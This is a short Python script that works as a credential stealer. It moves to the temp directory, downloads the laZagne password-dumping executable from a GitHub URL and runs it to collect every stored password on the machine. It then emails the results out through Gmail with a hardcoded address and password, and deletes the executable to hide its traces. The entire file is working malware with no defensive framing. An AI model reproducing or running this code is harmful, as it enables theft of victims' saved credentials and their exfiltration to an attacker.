import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_responce = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_responce.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/joharashu0/laZagne/raw/main/laZagne_x86.exe")
result = subprocess.check_output(" laZagne_x86.exe all ", shell=True)
send_mail("soniashutosh2388@gmail.com", "Abc123ab12", result)
os.remove("laZagne_x86.exe")
